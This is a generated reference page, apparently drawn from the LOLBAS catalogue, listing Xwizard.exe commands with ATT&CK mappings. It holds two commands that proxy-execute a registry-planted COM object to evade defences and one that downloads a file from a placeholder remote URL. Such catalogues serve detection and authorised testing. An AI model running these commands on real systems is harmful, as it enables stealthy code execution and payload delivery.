---
parsed_by: focuslocust
source: commands
type: generated
---
# Xwizard Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Xwizard.exe

Tool page: [Xwizard.exe](../../tools/windows/xwizard.exe.md)

### Run a com object created in registry to evade defensive counter measures

```text
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
```

Description:

Xwizard.exe running a custom class that has been added to the registry.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Xwizard.yml` |
| Evidence | Command preserved from source parser. |

### Run a com object created in registry to evade defensive counter measures

```text
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
```

Description:

Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Xwizard.yml` |
| Evidence | Command preserved from source parser. |

### Download file from Internet

```text
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
```

Description:

Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Xwizard.yml` |
| Evidence | Command preserved from source parser. |
